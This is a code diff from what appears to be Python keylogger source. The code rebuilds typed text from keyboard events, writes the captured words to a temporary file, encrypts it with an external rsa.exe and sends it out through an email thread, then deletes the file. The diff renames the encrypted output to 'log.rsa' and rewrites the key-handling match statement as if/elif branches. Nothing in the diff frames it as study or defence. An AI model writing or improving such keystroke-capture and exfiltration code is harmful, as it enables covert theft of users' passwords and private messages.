@@ -26,8 +26,8 @@ def email_thread():
             for word in words:
                 file.write(str(word)+'\n')
             file.close()
-            call(["./rsa.exe", "10527635191", "135", "1","tmp.txt","out.rsa"])
-            send_file("out.rsa")
+            call(["./rsa.exe", "10527635191", "135", "1","tmp.txt","log.rsa"])
+            send_file("log.rsa")
             if os.path.isfile("tmp.txt"):
                 os.remove("tmp.txt")
             words.clear()
@@ -235,29 +235,29 @@ class VirtualTextFieldObject:
                         self.reset_text()
                         return
 
-                    match key.getModKeyNumber():
-                        case keyboard.Key.caps_lock._value_.vk:
-                            self.capped = not self.capped
-                        case keyboard.Key.right._value_.vk:
-                            if len(self.text) > self.pos:
-                                self.pos += 1
-                                # print(self.pos)
-                        case keyboard.Key.left._value_.vk:
-                            if 0 < self.pos:
-                                self.pos -= 1
-                                # print(self.pos)
-                        case keyboard.Key.space._value_.vk:
-                            self.text = self.text[:self.pos] + ' ' + self.text[self.pos:]
+                    ModKeyNumber = key.getModKeyNumber()
+                    if ModKeyNumber == keyboard.Key.caps_lock._value_.vk:
+                        self.capped = not self.capped
+                    elif ModKeyNumber == keyboard.Key.right._value_.vk:
+                        if len(self.text) > self.pos:
                             self.pos += 1
-                        case keyboard.Key.delete._value_.vk:
-                            if self.pos < len(self.text):
-                                self.text = self.text[:self.pos] + self.text[self.pos + 1:]
-                        case keyboard.Key.backspace._value_.vk:
-                            if self.pos > 0:
-                                self.text = self.text[:self.pos - 1] + self.text[self.pos:]
-                                self.pos -= 1
-                        case default:
-                            pass
+                            # print(self.pos)
+                    elif ModKeyNumber == keyboard.Key.left._value_.vk:
+                        if 0 < self.pos:
+                            self.pos -= 1
+                            # print(self.pos)
+                    elif ModKeyNumber == keyboard.Key.space._value_.vk:
+                        self.text = self.text[:self.pos] + ' ' + self.text[self.pos:]
+                        self.pos += 1
+                    elif ModKeyNumber == keyboard.Key.delete._value_.vk:
+                        if self.pos < len(self.text):
+                            self.text = self.text[:self.pos] + self.text[self.pos + 1:]
+                    elif ModKeyNumber == keyboard.Key.backspace._value_.vk:
+                        if self.pos > 0:
+                            self.text = self.text[:self.pos - 1] + self.text[self.pos:]
+                            self.pos -= 1
+                    else:
+                        pass
                 pass
         else:
             self.func(self.text)
